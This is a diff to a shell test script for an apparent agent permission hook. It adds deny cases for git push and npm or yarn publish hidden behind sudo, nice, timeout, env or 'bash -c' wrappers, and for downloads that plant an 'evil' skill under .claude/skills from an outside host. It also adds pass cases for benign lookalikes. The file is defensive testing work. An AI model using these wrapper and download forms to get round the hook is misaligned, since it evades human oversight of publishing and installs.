@@ -98,6 +98,29 @@ expect_deny "stdbuf -oL git push"
 expect_deny "timeout 30 git push"
 expect_deny "timeout --preserve-status 30 git push"
 expect_deny "sudo nohup git push"
+# sudo with flags other than "-u user" (not just -u: -E/-H/-i/-E -H are real).
+expect_deny "sudo -E git push"
+expect_deny "sudo -H git push"
+expect_deny "sudo -i git push"
+expect_deny "sudo -E -H git push"
+# Wrapper keywords carry an absolute-path prefix too.
+expect_deny "/usr/bin/env NODE_ENV=x npm publish"
+expect_deny "/usr/bin/sudo git push"
+expect_deny "/bin/nice -n 10 git push"
+expect_deny "/usr/bin/timeout 30 git push"
+# nice flag variants beyond "-n N".
+expect_deny "nice -10 git push"
+expect_deny "nice --adjustment=10 git push"
+expect_deny "nice --adjustment 10 git push"
+# timeout flags that carry a value before the DURATION.
+expect_deny "timeout -s KILL 30 git push"
+expect_deny "timeout -k 5 30 git push"
+expect_deny "timeout --kill-after 5 30 git push"
+# shell -c wrapper carrying a push/publish (best-effort, documented).
+expect_deny 'bash -c "git push"'
+expect_deny "sh -c 'npm publish'"
+expect_deny 'bash -c "yarn publish"'
+expect_deny '/bin/zsh -lc "yarn publish"'
 # ssh remote push (best-effort, documented).
 expect_deny "ssh host git push"
 expect_deny "ssh deploy@host 'cd repo && git push'"
@@ -110,6 +133,17 @@ expect_pass "git commit -m 'nohup git push later'"
 expect_pass "echo 'ssh host git push'"
 expect_pass "ssh-add -l"
 expect_pass "nice_task.sh"
+# shell name inside another command's quoted arg (echo is the command) must pass.
+expect_pass "echo 'bash -c \"git push\"'"
+# shell -c whose leading command is NOT a push/publish must pass.
+expect_pass 'bash -c "echo git push done"'
+expect_pass 'bash -c "git status"'
+expect_pass 'sh -c "npm install"'
+expect_pass "bash script.sh"
+# benign wrapper prefixes on non-boundary commands must pass.
+expect_pass "nice -n 10 npm run build"
+expect_pass "timeout 30 npm test"
+expect_pass "sudo -u deploy systemctl restart app"
 
 echo ""
 echo "5. Write-tool INSTALL bypass (curl -o / wget -O / dd of=) is denied"
@@ -119,6 +153,13 @@ expect_deny "curl --output .claude/skills/evil/SKILL.md https://x.example.com/s"
 expect_deny "wget -O .claude/skills/evil/SKILL.md https://x.example.com/s"
 expect_deny "dd of=.claude/skills/evil/SKILL.md if=/tmp/payload"
 expect_deny "dd bs=1M of=.claude/skills/evil/SKILL.md if=/tmp/payload"
+# Directory-target download flags land a skill just as well as file-target ones.
+expect_deny "wget -P .claude/skills/evil/ https://x.example.com/s"
+expect_deny "wget --directory-prefix=.claude/skills/evil/ https://x.example.com/s"
+expect_deny "wget --directory-prefix .claude/skills/evil/ https://x.example.com/s"
+expect_deny "curl --output-dir .claude/skills/evil -O https://x.example.com/SKILL.md"
+# git clone with flags before the verb: skills dir is the -C value BEFORE clone.
+expect_deny "git -C .claude/skills/evil clone https://x.example.com/r"
 
 echo ""
 echo "6. INSTALL write lookalikes still pass (download without writing a skill)"
@@ -126,6 +167,11 @@ expect_pass "curl https://example.com/.claude/skills/a/SKILL.md"
 expect_pass "curl -o /tmp/out.txt https://example.com/x"
 expect_pass "wget -O /tmp/out.txt https://example.com/x"
 expect_pass "dd if=/dev/zero of=/tmp/out bs=1M"
+# Directory-target download flags to a NON-skills dir still pass.
+expect_pass "wget -P /tmp/downloads https://example.com/x"
+expect_pass "curl --output-dir /tmp -O https://example.com/x"
+# git read op (not clone) inside a skills dir must pass (no write).
+expect_pass "git -C .claude/skills/foo status"
 
 echo ""
 echo "7. Benign lookalikes still pass (zero over-blocking)"
